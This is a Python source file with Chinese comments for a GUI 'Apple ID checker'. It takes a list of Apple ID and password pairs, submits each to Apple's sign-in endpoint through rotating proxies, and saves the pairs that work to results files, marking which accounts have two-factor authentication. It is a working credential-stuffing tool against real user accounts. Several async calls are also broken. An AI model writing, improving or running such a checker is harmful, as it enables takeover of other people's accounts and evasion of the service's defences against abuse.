import threading
import asyncio
import aiohttp
import PySimpleGUI as sg
import os
from datetime import datetime
import logging
import json


# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
# 创建文件处理器，指定日志文件的名称和写入模式
file_handler = logging.FileHandler('my_log_file.log', mode='a')
# 设置日志格式
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
# 将文件处理器添加到日志记录器
logger.addHandler(file_handler)


# 创建统计数据类
# 使用asyncio.Lock来确保在异步环境中对统计数据的访问和修改是线程安全的。
class Statistics:
    def __init__(self):
        self.data = {"total": 0, "correct": 0,
                     "2fa": 0, "locked": 0, "error": 0}
        self.processed_accounts = 0
        self.lock = asyncio.Lock()

    async def update(self, key, value):
        async with self.lock:
            if key in self.data:
                self.data[key] += value

    async def increment_total(self):
        async with self.lock:
            self.processed_accounts += 1

    async def get_stats(self):
        async with self.lock:
            return self.data.copy(), self.processed_accounts


# 创建结果文件夹和文件
folder_name = datetime.now().strftime("%Y%m%d%H%M%S")
os.makedirs(f'results/{folder_name}', exist_ok=True)


# 更新GUI界面
async def update_gui(window, stats):
    while True:
        await asyncio.sleep(0.5)
        try:
            current_stats, processed_accounts = await stats.get_stats()
            for key, value in current_stats.items():
                window[f"-{key.upper()}-"].update(value)

            # 更新进度条
            total_accounts = int(window['-COUNT-'].get())
            if total_accounts > 0:  # 避免除以零
                progress = (processed_accounts / total_accounts) * 100
                window['progress'].update_bar(progress, 100)
        except Exception as e:
            logger.error(f"Failed to update GUI: {e}")
            break

# 定义窗口的内容和布局
row1 = [sg.Text("总数", size=(8, 1)),
        sg.Text("正确", size=(6, 1)),
        sg.Text("双重", size=(8, 1)),
        sg.Text("被锁", size=(6, 1)),
        sg.Text("错误", size=(8, 1))]
row2 = [sg.Text("-", size=(8, 1), key="-COUNT-"),
        sg.Text("-", size=(8, 1), key="-CORRECT-"),
        sg.Text("-", size=(8, 1), key="-2FA-"),
        sg.Text("-", size=(8, 1), key="-LOCKED-"),
        sg.Text("-", size=(8, 1), key="-ERROR-")]
row3 = [[sg.Text("输入文件：", size=(8, 1)), sg.InputText(key="-APPLEIDFILE-", size=(25, 1)),
         sg.FileBrowse(button_text="选择文件", file_types=(("文本文件", "*.txt"),))],
        [sg.Text("代理接口：", size=(8, 1)), sg.Input(
            key='-PROXYURL-', size=(35, 1))],
        [sg.Text("线程数量：", size=(8, 1)), sg.Input(
            key='-THREAD-', size=(35, 1))],
        [sg.Text("检测进度：", size=(8, 1)), sg.ProgressBar(1, orientation='h', size=(
            25, 15), key='progress', bar_color=('green', 'white'))]]
row4 = [sg.Button('Start'), sg.Button('Stop'), sg.Button('View')]

# 定义窗口的布局
layout = [[sg.Column([
    [sg.Frame('检测结果：', [row1, row2])],
    [sg.Frame('检测设置：', row3)],
    [sg.Frame('检测控制：', [row4])]
])]]

# 创建窗口
window = sg.Window('Apple ID 检存工具', layout)

# 在窗口创建后启动GUI更新线程
stats = Statistics()
update_thread = threading.Thread(
    target=update_gui, args=(window, stats,), daemon=True)
update_thread.start()


# 创建文件写入函数
def write_to_correct_file(apple_id, password):
    with open(f'results/{folder_name}/correct.txt', 'a') as file:
        file.write(f"{apple_id}----{password}\n")


def write_to_two_factor_file(apple_id, password):
    with open(f'results/{folder_name}/2fa.txt', 'a') as file:
        file.write(f"{apple_id}----{password}\n")


# 代理IP池
class ProxyPool:
    def __init__(self, api_url, num_proxies_to_fetch):
        self.api_url = api_url
        self.num_proxies_to_fetch = num_proxies_to_fetch
        self.proxy_queue = asyncio.Queue()
        self.lock = asyncio.Lock()
        self.stop_event = asyncio.Event()

    async def replenish_proxies(self):
        while not self.stop_event.is_set():
            async with self.lock:
                if self.proxy_queue.qsize() < self.num_proxies_to_fetch:
                    async with aiohttp.ClientSession() as session:
                        try:
                            async with session.get(self.api_url) as response:
                                proxies = await response.text()
                                for proxy in proxies.strip().split('\n'):
                                    await self.proxy_queue.put(proxy.strip())
                        except Exception as e:
                            logger.error(f"Failed to fetch proxies: {e}")
            await asyncio.sleep(5)  # 等待一段时间再次检查

    async def get_proxy(self):
        return await self.proxy_queue.get()

    async def stop(self):
        self.stop_event.set()  # 通知补充操作停止
        # 可以在这里添加额外的逻辑，例如等待当前补充操作完成


# 帐号密码对池
class AccountPool:
    def __init__(self, file_path):
        self.account_queue = asyncio.Queue()
        self.load_accounts(file_path)

    async def load_accounts(self, file_path):
        with open(file_path, 'r') as file:
            for line in file:
                apple_id, password = line.strip().split('----')
                await self.account_queue.put((apple_id, password))

    async def get_account(self):
        return await self.account_queue.get() if not self.account_queue.empty() else None


# 定义共享状态标志
stop_event = asyncio.Event()


class AsyncAppleIDChecker:
    def __init__(self, proxy_pool, account_pool, stats):
        self.URL = 'https://idmsa.apple.com/appleauth/auth/signin'
        self.HEADERS = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "X-Apple-Locale": "QT-EN",
            "X-Apple-Trusted-Domain": "https://idmsa.apple.com",
            "Origin": "https://idmsa.apple.com",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.proxy_pool = proxy_pool
        self.account_pool = account_pool
        self.stats = stats
        self.session = aiohttp.ClientSession(headers=self.HEADERS)

    async def check_account(self):
        while not stop_event.is_set():
            account = await self.account_pool.get_account()
            if account is None:
                break  # 如果队列为空，则退出循环

            apple_id, password = account
            proxy_ip = await self.proxy_pool.get_proxy()
            proxy = {
                "http": f"http://{proxy_ip}",
                "https": f"http://{proxy_ip}"
            }
            try:
                async with self.session.post(self.URL, json={"accountName": apple_id, "password": password, "rememberMe": False}, proxy=proxy) as response:
                    response_text = await response.text()
                    await self.stats.increment_total()
                    return self.process_response(apple_id, password, response_text)
            except aiohttp.ClientError as e:
                logger.error(f"HTTP错误: {e}")
                # 错误处理: 重新加入队列并更换代理
                self.account_pool.account_queue.put(account)
                await asyncio.sleep(1)  # 短暂等待后重试
            account = self.account_pool.get_account()
            # 定期检查是否应该停止
            if stop_event.is_set():
                break

    def process_response(self, apple_id, password, response_text):
        global stats
        try:
            response_json = json.loads(response_text)
        except json.JSONDecodeError:
            # If response is not JSON, it's an unknown error
            logger.error(
                f'Non-JSON response for AppleID -> {apple_id}:{password} | {response_text}')
            self.stats.update("error", 1)
            return {"status": "未知错误", "message": "返回内容格式异常，无法解析为JSON。"}
        except Exception as e:
            logger.error(f"处理响应时发生未知错误：{e}")
            self.stats.update("error", 1)   # 更新错误计数
            return {"status": "未知错误", "message": "处理响应时发生未知错误。"}

        if response_json.get('authType') == "non-sa":
            logger.info(
                f'密码正确 NO 2FA AppleID -> {apple_id}:{password}｜{response_text}')
            self.stats.update("correct", 1)
            write_to_correct_file(apple_id, password)
            return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}
        elif response_json.get('authType') in ["sa", "hsa2"]:
            logger.info(
                f'双重认证 2FA AppleID -> {apple_id}:{password}｜{response_text}')
            self.stats.update("2fa", 1)
            write_to_two_factor_file(apple_id, password)
            return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}
        elif "serviceErrors" in response_json:
            for error in response_json["serviceErrors"]:
                if error.get("code") == "-20101":
                    logger.info(
                        f'密码错误 AppleID -> {apple_id}:{password}|{response_text}')
                    return {"status": "密码错误", "message": "帐号或密码错误。"}
        elif 'locked' in response_text:
            logger.info(f'账户已锁定 AppleID -> {apple_id}:{password}')
            self.stats.update("locked", 1)
            return {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
        else:
            logger.error(
                f'错误 AppleID -> {apple_id}:{password}|{response_text}')
            self.stats.update("error", 1)
            return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}

    async def close(self):
        await self.session.close()


# 使用示例
async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FETCH=200):
    stats = Statistics()
    proxy_pool = ProxyPool(proxy_api_url, NUM_PROXIES_TO_FETCH)
    account_pool = AccountPool(appleid_file_path)
    checker = AsyncAppleIDChecker(proxy_pool, account_pool, stats)

    tasks = [asyncio.create_task(checker.check_account())
             for _ in range(concurrency)]
    await asyncio.gather(*tasks)

    await checker.close()
    proxy_pool.stop()  # 确保实现了ProxyPool的停止逻辑


# 定义标志变量
is_running = False

# 事件循环
while True:
    event, values = window.read()

    if event == sg.WINDOW_CLOSED:
        break
    elif event == 'Start' and not is_running:
        # 禁用“Start”按钮
        window['Start'].update(disabled=True)
        # 获取GUI输入值
        # TODO: 添加输入值验证, 例如检查文件是否输入, 代理URL是否为空，线程数量是否为数字等
        # TODO：添加一个文本框来显示日志
        appleid_file_path = values["-APPLEIDFILE-"]
        proxy_api_url = values["-PROXYURL-"]
        concurrency_input = values["-THREAD-"]
        concurrency = int(
            concurrency_input) if concurrency_input.isdigit() else 10

        # 标记任务集正在运行
        is_running = True

        # 启动异步任务
        asyncio.run(main(appleid_file_path, proxy_api_url, concurrency))

        # 任务完成，重新启用“Start”按钮
        window['Start'].update(disabled=False)

        # 任务完成后重置标志变量
        is_running = False

        stop_event.clear()  # 重置停止事件, 以便下次运行时可以正常工作
    elif event == 'Stop':
        stop_event.set()  # 设置停止事件, 以便异步任务可以正常退出
        window['Start'].update(disabled=False)  # 重新启用“Start”按钮

# 清理和关闭
window.close()
